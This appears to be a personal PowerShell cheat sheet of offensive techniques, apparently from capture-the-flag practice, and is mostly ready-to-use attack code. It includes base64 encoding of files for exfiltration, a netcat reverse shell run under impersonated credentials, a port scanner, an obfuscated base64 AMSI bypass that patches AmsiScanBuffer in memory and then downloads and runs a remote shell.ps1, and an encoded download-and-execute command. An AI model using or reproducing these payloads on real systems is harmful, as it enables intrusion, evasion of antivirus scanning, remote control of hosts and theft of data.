# Basics
**Calculated Property**
```
@{ Name=''; Expression={} }
```


## Encode EXE file to base64
- Exfiltrate data
```bash
[convert]::ToBase64String((Get-Content -path "App.exe" -Encoding byte))
```

## Port forwarding
- Excerpt from machine: hancliffe.htb
- Application listens on random port for each start
```bash
# Restart app every 3 mins to avoid crashes
while($true) {
  # Delete existing forwards
  cmd /c "netsh interface portproxy delete v4tov4 listenport=9999 listenaddress=0.0.0.0"
  # Spawn app
  $proc = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList ("C:\DevApp\MyFirstApp.exe")
  sleep 2
  # Get random port
  $port = (Get-NetTCPConnection -OwningProcess $proc.ProcessId).LocalPort
  # Forward port to 9999
  cmd /c "netsh interface portproxy add v4tov4 listenport=9999 listenaddress=0.0.0.0 connectport=$port connectaddress=127.0.0.1"
  sleep 180
  # Kill and repeat
  taskkill /f /t /im MyFirstApp.exe
}
```

## List Service Accounts
```bash
PS C:\> get-wmiobject win32_service | format-list Name, DisplayName, StartName, State, PathName

PS C:\> get-wmiobject win32_service | where {$_.State -eq "Running"} | format-list Name, DisplayName, StartName, PathName

PS C:\> get-wmiobject win32_service | format-table name, startname, startmode    
name                                     startname                   startmode                                                                                                                                                               
----                                     ---------                   ---------                                                                                                                                                               
AppHostSvc                               localSystem                 Auto                                                                                                                                                                    
AppIDSvc                                 NT Authority\LocalService   Manual                                                                                                                                                                  
AppMgmt                                  LocalSystem                 Manual                                                                                                                                                                  
AppReadiness                             LocalSystem                 Manual                                                                                                                                                                  
AppXSvc                                  LocalSystem                 Manual                                                                                                                                                                  
aspnet_state                             NT AUTHORITY\NetworkService Manual                                                                                                                                                                  
BFE                                      NT AUTHORITY\LocalService   Disabled                                                                                                                                                                
BITS                                     LocalSystem                 Manual                                                                                                                                                                  
CertPropSvc                              LocalSystem                 Manual                                                                                                                                                                  
cexecsvc                                 LocalSystem                 Auto                                                                                                                                                                    
ClipSVC                                  LocalSystem                 Disabled                                                                                                                                                                
COMSysApp                                LocalSystem                 Manual                                                                                                                                                                  
CoreMessagingRegistrar                   NT AUTHORITY\LocalService   Auto                                                                                                                                                                    
CryptSvc                                 NT Authority\NetworkService Auto  
```

### Runas user
- Impersonate user
```bash
PS C:\> $pass = ConvertTo-SecureString 'Pass123!' -AsPlainText -Force
PS C:\> $cred = New-Object System.Management.Automation.PSCredential('domain\user', $pass)
PS C:\> Start-Process .\nc.exe -ArgumentList "-e cmd.exe", "10.9.163.154", "4444" -Credential $cred
```


### Port scanning

```txt
cmd /c powershell -ep bypass function testport ($hostname,$port=80,$timeout=100) {$requestCallback = $state = $null;$client = New-Object System.Net.Sockets.TcpClient;$beginConnect = $client.BeginConnect($hostname,$port,$requestCallback,$state);Start-Sleep -milli $timeOut;if ($client.Connected) { $open = $true } else { $open = $false }; $client.Close();if ($open){[pscustomobject]@{port=$port}}} foreach ($p in 80..8000) {testport "127.0.0.1" $p}
```

### AMSI Bypass + Reverse Shell

```powershell
cmd /c powershell -c "$b64='dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CgpuYW1lc3BhY2UgQlAKewogICAgcHVibGljIGNsYXNzIEFNUwogICAgewogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldFByb2NBZGRyZXNzKEludFB0ciBoTW9kdWxlLCBzdHJpbmcgcHJvY05hbWUpOwogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIExvYWRMaWJyYXJ5KHN0cmluZyBuYW1lKTsKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgVmlydHVhbFByb3RlY3QoSW50UHRyIGxwQWRkcmVzcywgVUludFB0ciBkd1NpemUsIHVpbnQgZmxOZXdQcm90ZWN0LCBvdXQgdWludCBscGZsT2xkUHJvdGVjdCk7CgogICAgICAgIFtEbGxJbXBvcnQoIktlcm5lbDMyLmRsbCIsIEVudHJ5UG9pbnQgPSAiUnRsTW92ZU1lbW9yeSIsIFNldExhc3RFcnJvciA9IGZhbHNlKV0KICAgICAgICBzdGF0aWMgZXh0ZXJuIHZvaWQgTW92ZU1lbW9yeShJbnRQdHIgZGVzdCwgSW50UHRyIHNyYywgaW50IHNpemUpOwoKCiAgICAgICAgcHVibGljIHN0YXRpYyB2b2lkIERpc2FibGUoKQogICAgICAgIHsKICAgICAgICAgICAgSW50UHRyIEFNU0RMTCA9IExvYWRMaWJyYXJ5KCJhbXNpLmRsbCIpOwogICAgICAgICAgICBJbnRQdHIgQU1TQlB0ciA9IEdldFByb2NBZGRyZXNzKEFNU0RMTCwgIkFtIiArICJzaSIgKyAiU2NhbiIgKyAiQnVmZmVyIik7CiAgICAgICAgICAgIFVJbnRQdHIgZHdTaXplID0gKFVJbnRQdHIpNTsKICAgICAgICAgICAgdWludCBaZXJvID0gMDsKICAgICAgICAgICAgVmlydHVhbFByb3RlY3QoQU1TQlB0ciwgZHdTaXplLCAweDQwLCBvdXQgWmVybyk7CiAgICAgICAgICAgIEJ5dGVbXSBQYXRjaDEgPSB7IDB4MzEgfTsKICAgICAgICAgICAgQnl0ZVtdIFBhdGNoMiA9IHsgMHhmZiB9OwogICAgICAgICAgICBCeXRlW10gUGF0Y2gzID0geyAweDkwIH07CiAgICAgICAgICAgIEludFB0ciB1bm1hbmFnZWRQb2ludGVyMSA9IE1hcnNoYWwuQWxsb2NIR2xvYmFsKDEpOwogICAgICAgICAgICBNYXJzaGFsLkNvcHkoUGF0Y2gxLCAwLCB1bm1hbmFnZWRQb2ludGVyMSwgMSk7CiAgICAgICAgICAgIE1vdmVNZW1vcnkoQU1TQlB0ciArIDB4MDAxYiwgdW5tYW5hZ2VkUG9pbnRlcjEsIDEpOwogICAgICAgICAgICBJbnRQdHIgdW5tYW5hZ2VkUG9pbnRlcjIgPSBNYXJzaGFsLkFsbG9jSEdsb2JhbCgxKTsKICAgICAgICAgICAgTWFyc2hhbC5Db3B5KFBhdGNoMiwgMCwgdW5tYW5hZ2VkUG9pbnRlcjIsIDEpOwogICAgICAgICAgICBNb3ZlTWVtb3J5KEFNU0JQdHIgKyAweDAwMWMsIHVubWFuYWdlZFBvaW50ZXIyLCAxKTsKICAgICAgICAgICAgSW50UHRyIHVubWFuYWdlZFBvaW50ZXIzID0gTWFyc2hhbC5BbGxvY0hHbG9iYWwoMSk7CiAgICAgICAgICAgIE1hcnNoYWwuQ29weShQYXRjaDMsIDAsIHVubWFuYWdlZFBvaW50ZXIzLCAxKTsKICAgICAgICAgICAgTW92ZU1lbW9yeShBTVNCUHRyICsgMHgwMDFkLCB1bm1hbmFnZWRQb2ludGVyMywgMSk7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJNZW1vcnkgcGF0Y2hlZCBzdWNjZXNzZnVseS4iKTsgCiAgICAgICAgfQogICAgfQp9';$bytes = [Convert]::FromBase64String($b64);$code = [Text.Encoding]::UTF8.GetString($bytes);Add-Type -TypeDefinition ($code) -OutputAssembly 'amsi.dll';[Reflection.Assembly]::LoadFrom('amsi.dll');[BP.AMS]::Disable();iex(new-object net.webclient).downloadstring('http://10.10.2.304/shell.ps1')"
```

```bash
# ref: https://adamtheautomator.com/netstat-port/

Get-NetTCPConnection -State Listen | Select-Object -Property *,@{Name='ProcessName';Expression={(Get-Process -Id $_.OwningProcess).Name}} | Select ProcessName,LocalAddress,LocalPort
```

Base64 Encoded Command
- iconv utility
```bash
$ echo -n 'iex(new-object net.webclient).downloadstring("http://10.10.14.8/shell.ps1")' | iconv -t utf-16le | base64 -w 0

aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADgALwBzAGgAZQBsAGwALgBwAHMAMQAiACkA
```